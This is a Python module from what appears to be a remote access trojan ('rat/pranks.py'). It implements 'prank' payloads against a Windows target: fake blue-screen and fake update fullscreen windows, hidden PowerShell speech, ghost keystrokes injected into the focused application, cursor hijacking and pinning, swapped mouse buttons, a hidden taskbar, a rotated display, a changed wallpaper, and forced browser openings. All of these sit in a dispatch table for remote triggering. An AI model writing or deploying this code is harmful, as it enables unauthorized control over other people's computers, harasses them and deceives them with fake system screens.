#!/usr/bin/env python3
# rat/pranks.py — prank payload module. windows target, stdlib only.
# every prank runs in a daemon thread and honors STOP_EVENT ("stop" prank).
import ctypes, ctypes.wintypes, math, random, struct, threading, time, subprocess, webbrowser, os, tempfile

POINT = ctypes.wintypes.POINT
byref = ctypes.byref

STOP_EVENT = threading.Event()
_TK_WINDOWS = []
_TK_LOCK = threading.Lock()

if os.name == "nt":
    user32 = ctypes.windll.user32
    gdi32 = ctypes.windll.gdi32
    kernel32 = ctypes.windll.kernel32
    winmm = ctypes.WinDLL("winmm")  # mciSendStringW lives here, not in user32
    winmm.mciSendStringW.argtypes = (ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_uint, ctypes.c_void_p)
else:
    user32 = None
    gdi32 = None
    kernel32 = None

KEYEVENTF_UNICODE = 0x0004
KEYEVENTF_KEYUP = 0x0002
INPUT_KEYBOARD = 1


class KEYBDINPUT(ctypes.Structure):
    _fields_ = [("wVk", ctypes.c_ushort), ("wScan", ctypes.c_ushort),
                ("dwFlags", ctypes.c_ulong), ("time", ctypes.c_ulong),
                ("dwExtraInfo", ctypes.c_size_t)]


class MOUSEINPUT(ctypes.Structure):
    _fields_ = [("dx", ctypes.c_long), ("dy", ctypes.c_long),
                ("mouseData", ctypes.c_ulong), ("dwFlags", ctypes.c_ulong),
                ("time", ctypes.c_ulong), ("dwExtraInfo", ctypes.c_size_t)]


class _INPUT_U(ctypes.Union):
    # must match win32 INPUT exactly (40 bytes on x64) or SendInput silently rejects
    _fields_ = [("mi", MOUSEINPUT), ("ki", KEYBDINPUT)]


class INPUT(ctypes.Structure):
    _fields_ = [("type", ctypes.c_ulong), ("u", _INPUT_U)]


class DEVMODEW(ctypes.Structure):
    # display-branch layout of win32 DEVMODEW (220 bytes on x64):
    # the union with printer shorts is flattened to its display form,
    # which is all prank_rotate needs
    _fields_ = [
        ("dmDeviceName", ctypes.c_wchar * 32),
        ("dmSpecVersion", ctypes.c_ushort),
        ("dmDriverVersion", ctypes.c_ushort),
        ("dmSize", ctypes.c_ushort),
        ("dmDriverExtra", ctypes.c_ushort),
        ("dmFields", ctypes.c_ulong),
        ("dmPositionX", ctypes.c_long),
        ("dmPositionY", ctypes.c_long),
        ("dmDisplayOrientation", ctypes.c_ulong),
        ("dmDisplayFixedOutput", ctypes.c_ulong),
        ("dmColor", ctypes.c_short),
        ("dmDuplex", ctypes.c_short),
        ("dmYResolution", ctypes.c_short),
        ("dmTTOption", ctypes.c_short),
        ("dmCollate", ctypes.c_short),
        ("dmFormName", ctypes.c_wchar * 32),
        ("dmLogPixels", ctypes.c_ushort),
        ("dmBitsPerPel", ctypes.c_ulong),
        ("dmPelsWidth", ctypes.c_ulong),
        ("dmPelsHeight", ctypes.c_ulong),
        ("dmDisplayFlags", ctypes.c_ulong),
        ("dmDisplayFrequency", ctypes.c_ulong),
        ("dmICMMethod", ctypes.c_ulong),
        ("dmICMIntent", ctypes.c_ulong),
        ("dmMediaType", ctypes.c_ulong),
        ("dmDitherType", ctypes.c_ulong),
        ("dmReserved1", ctypes.c_ulong),
        ("dmReserved2", ctypes.c_ulong),
        ("dmPanningWidth", ctypes.c_ulong),
        ("dmPanningHeight", ctypes.c_ulong),
    ]


def _send_char(ch: str) -> None:
    if not user32:
        return
    def mk(scan, flags):
        i = INPUT()
        i.type = INPUT_KEYBOARD
        i.u.ki.wScan = scan
        i.u.ki.dwFlags = flags
        return i
    code = ord(ch) if len(ch) == 1 and not (0xD800 <= ord(ch) <= 0xDFFF) else 0x20
    arr = (INPUT * 2)(mk(code, KEYEVENTF_UNICODE), mk(code, KEYEVENTF_UNICODE | KEYEVENTF_KEYUP))
    user32.SendInput(2, arr, ctypes.sizeof(INPUT))


def _w(func):
    # windows guard wrapper: uniform signature fn(text=None, url=None) -> dict
    def guard(text=None, url=None):
        if user32 is None:
            return {"ok": False, "err": "windows only"}
        return func(text=text, url=url)
    return guard


def _spawn(run) -> dict:
    threading.Thread(target=run, daemon=True).start()
    return {"ok": True}


@_w
def prank_msgbox(text=None, url=None):
    t = text or "hello :)"
    def run():
        user32.MessageBoxW(0, t, "System", 0x40)
    return _spawn(run)


@_w
def prank_speak(text=None, url=None):
    t = (text or "your computer has been annexed").replace('"', "'")
    ps = f'(New-Object -ComObject SAPI.SpVoice).Speak("{t}")'
    subprocess.Popen(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-c", ps],
                     creationflags=0x08000000)  # CREATE_NO_WINDOW
    return {"ok": True}


@_w
def prank_jiggle(text=None, url=None):
    def run():
        pt = POINT()
        end = time.time() + 20
        while time.time() < end and not STOP_EVENT.is_set():
            user32.GetCursorPos(byref(pt))
            user32.SetCursorPos(pt.x + random.randint(-40, 40), pt.y + random.randint(-40, 40))
            time.sleep(0.12)
    return _spawn(run)


@_w
def prank_cdtray(text=None, url=None):
    def run():
        for _ in range(3):
            if STOP_EVENT.is_set():
                return
            winmm.mciSendStringW("set cdaudio door open", None, 0, 0)
            time.sleep(2.5)
            winmm.mciSendStringW("set cdaudio door closed", None, 0, 0)
            time.sleep(1.5)
    return _spawn(run)


@_w
def prank_volume(text=None, url=None):
    def run():
        VK_UP, VK_DOWN = 0xAF, 0xAE
        for _ in range(50):  # floor first so the max actually lands
            user32.keybd_event(VK_DOWN, 0, 0, 0)
            user32.keybd_event(VK_DOWN, 0, 2, 0)
            time.sleep(0.01)
        for _ in range(60):
            if STOP_EVENT.is_set():
                return
            user32.keybd_event(VK_UP, 0, 0, 0)
            user32.keybd_event(VK_UP, 0, 2, 0)
            time.sleep(0.01)
    return _spawn(run)


@_w
def prank_invert(text=None, url=None):
    # solid blackout overlay for 4 s — reads clearly on any machine
    import tkinter as tk
    def build(root):
        root.configure(bg="black")
    _tk_window(build, 4)
    return {"ok": True}


@_w
def prank_fakeupdate(text=None, url=None):
    import tkinter as tk
    def build(root):
        root.configure(bg="#1a1a1a")
        tk.Label(root, text="Working on updates 0%", font=("Segoe UI", 40),
                 bg="#1a1a1a", fg="white").pack(expand=True)
        tk.Label(root, text="Don't turn off your PC", font=("Segoe UI", 20),
                 bg="#1a1a1a", fg="#cccccc").pack()
        prog = tk.Label(root, text="0%", font=("Segoe UI", 30), bg="#1a1a1a", fg="#4cc2ff")
        prog.pack(expand=True)
        def crawl():
            try:
                if not root.winfo_exists():
                    return
                prog.config(text=f"{random.randint(1, 99)}%")
                root.after(4000, crawl)
            except tk.TclError:
                pass
        crawl()
    _tk_window(build, 45)
    return {"ok": True}


@_w
def prank_bsod(text=None, url=None):
    import tkinter as tk
    def build(root):
        root.configure(bg="#0078D7")
        f = tk.Frame(root, bg="#0078D7")
        f.place(relx=0.5, rely=0.35, anchor="center")
        tk.Label(f, text=":(", font=("Segoe UI", 90), bg="#0078D7", fg="white").pack(anchor="w")
        tk.Label(f, text="Your PC ran into a problem and needs to restart.",
                 font=("Segoe UI", 18), bg="#0078D7", fg="white").pack(pady=10)
        pct = tk.Label(f, text="0% complete", font=("Segoe UI", 16), bg="#0078D7", fg="white")
        pct.pack(anchor="w")
        def crawl():
            try:
                if not root.winfo_exists():
                    return
                pct.config(text=f"{random.randint(0, 30)}% complete")
                root.after(1500, crawl)
            except tk.TclError:
                pass
        crawl()
        root.bind("<Escape>", lambda e: root.destroy())
    _tk_window(build, 30)
    return {"ok": True}


@_w
def prank_webpage(text=None, url=None):
    u = url or "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
    def run():
        for _ in range(3):
            if STOP_EVENT.is_set():
                return
            webbrowser.open(u)
            time.sleep(1.0)
    return _spawn(run)


@_w
def prank_spiral(text=None, url=None):
    def run():
        pt = POINT()
        user32.GetCursorPos(byref(pt))
        cx, cy = pt.x, pt.y
        end = time.time() + 15
        while time.time() < end and not STOP_EVENT.is_set():
            r = 20 + 30 * (15 - (end - time.time()))
            for step in range(24):
                a = step * (math.pi / 12) + time.time()
                user32.SetCursorPos(int(cx + r * math.cos(a)), int(cy + r * math.sin(a)))
                time.sleep(0.02)
                if STOP_EVENT.is_set():
                    return
    return _spawn(run)


@_w
def prank_wallpaper(text=None, url=None):
    # sets solid black wallpaper; reversible: desktop right-click -> personalize
    SPI_SETDESKWALLPAPER = 0x0014
    SPIF_SENDCHANGE = 0x03
    def run():
        path = os.path.join(tempfile.gettempdir(), "blk.bmp")
        dib = struct.pack("<IiiHHIIiiII", 40, 1, 1, 1, 24, 0, 4, 0, 0, 0, 0)
        px = b"\x00\x00\x00\x00"  # one black 24bpp pixel + row pad
        bmp = b"BM" + struct.pack("<IHHI", 58, 0, 0, 54) + dib + px
        with open(path, "wb") as f:
            f.write(bmp)
        user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, SPIF_SENDCHANGE)
    return _spawn(run)


@_w
def prank_type(text=None, url=None):
    # ghost typing into whatever is focused on the target
    t = text or "i see you"
    def run():
        for ch in t:
            if STOP_EVENT.is_set():
                return
            _send_char(ch)
            time.sleep(0.09)
    return _spawn(run)


@_w
def prank_notepad(text=None, url=None):
    t = text or "hi from your best friend"
    def run():
        subprocess.Popen(["notepad.exe"])
        time.sleep(1.2)
        for ch in t:
            if STOP_EVENT.is_set():
                return
            _send_char(ch)
            time.sleep(0.06)
    return _spawn(run)


@_w
def prank_swapmouse(text=None, url=None):
    # swaps mouse buttons for 30 s, then restores
    def run():
        user32.SwapMouseButton(True)
        end = time.time() + 30
        while time.time() < end and not STOP_EVENT.is_set():
            time.sleep(0.2)
        user32.SwapMouseButton(False)
    return _spawn(run)


@_w
def prank_taskbarhide(text=None, url=None):
    def run():
        h = user32.FindWindowW("Shell_TrayWnd", None)
        if not h:
            return
        user32.ShowWindow(h, 0)  # SW_HIDE
        end = time.time() + 12
        while time.time() < end and not STOP_EVENT.is_set():
            time.sleep(0.2)
        user32.ShowWindow(h, 5)  # SW_SHOW
    return _spawn(run)


@_w
def prank_hideicons(text=None, url=None):
    def run():
        h = user32.FindWindowW("Progman", None)
        if not h:
            return
        # PostMessage, not SendMessage: Progman's handler can block a
        # cross-thread SendMessage and swallow the toggle
        user32.PostMessageW(h, 0x0111, 0x7402, 0)  # WM_COMMAND: toggle desktop icons
        end = time.time() + 10
        while time.time() < end and not STOP_EVENT.is_set():
            time.sleep(0.2)
        user32.PostMessageW(h, 0x0111, 0x7402, 0)
    return _spawn(run)


@_w
def prank_beeps(text=None, url=None):
    melody = [(440, 200), (523, 200), (659, 200), (784, 350), (659, 200), (440, 300)]
    def run():
        for _ in range(3):
            for freq, dur in melody:
                if STOP_EVENT.is_set():
                    return
                kernel32.Beep(freq, dur)
    return _spawn(run)


@_w
def prank_mouseblock(text=None, url=None):
    # pins the cursor where it is for 12 s
    def run():
        pt = POINT()
        user32.GetCursorPos(byref(pt))
        cx, cy = pt.x, pt.y
        end = time.time() + 12
        while time.time() < end and not STOP_EVENT.is_set():
            user32.SetCursorPos(cx, cy)
            time.sleep(0.005)
    return _spawn(run)


@_w
def prank_rotate(text=None, url=None):
    # flips the display 180 degrees for 15 s, then restores
    DM_DISPLAYORIENTATION = 0x00000080
    ENUM_CURRENT_SETTINGS = -1
    def run():
        dm = DEVMODEW()
        dm.dmSize = ctypes.sizeof(DEVMODEW)
        if not user32.EnumDisplaySettingsW(None, ENUM_CURRENT_SETTINGS, byref(dm)):
            return
        target = 2 if dm.dmDisplayOrientation == 0 else 0  # DMDO_180 and back
        dm.dmDisplayOrientation = target
        dm.dmFields |= DM_DISPLAYORIENTATION
        user32.ChangeDisplaySettingsW(byref(dm), 0)
        end = time.time() + 15
        while time.time() < end and not STOP_EVENT.is_set():
            time.sleep(0.2)
        dm.dmDisplayOrientation = 0
        user32.ChangeDisplaySettingsW(byref(dm), 0)
    return _spawn(run)


def stop_all(text=None, url=None):
    STOP_EVENT.set()
    with _TK_LOCK:
        for w in list(_TK_WINDOWS):
            try:
                w.after(0, w.destroy)
            except Exception:
                pass
    time.sleep(0.3)
    STOP_EVENT.clear()
    return {"ok": True}


def _tk_window(builder, hold_s: float) -> None:
    import tkinter as tk
    def run():
        root = tk.Tk()
        root.attributes("-fullscreen", True)
        root.attributes("-topmost", True)
        builder(root)
        with _TK_LOCK:
            _TK_WINDOWS.append(root)
        def watch():
            try:
                if STOP_EVENT.is_set() or not root.winfo_exists():
                    root.destroy()
                    return
                root.after(300, watch)
            except tk.TclError:
                return
        root.after(300, watch)
        root.after(int(hold_s * 1000), root.destroy)
        root.mainloop()
        with _TK_LOCK:
            if root in _TK_WINDOWS:
                _TK_WINDOWS.remove(root)
    threading.Thread(target=run, daemon=True).start()


PRANK_FUNCS = {
    "msgbox": prank_msgbox,
    "speak": prank_speak,
    "jiggle": prank_jiggle,
    "cdtray": prank_cdtray,
    "volume": prank_volume,
    "invert": prank_invert,
    "fakeupdate": prank_fakeupdate,
    "webpage": prank_webpage,
    "spiral": prank_spiral,
    "wallpaper": prank_wallpaper,
    "bsod": prank_bsod,
    "type": prank_type,
    "notepad": prank_notepad,
    "swapmouse": prank_swapmouse,
    "taskbarhide": prank_taskbarhide,
    "hideicons": prank_hideicons,
    "beeps": prank_beeps,
    "mouseblock": prank_mouseblock,
    "rotate": prank_rotate,
    "stop": stop_all,
}
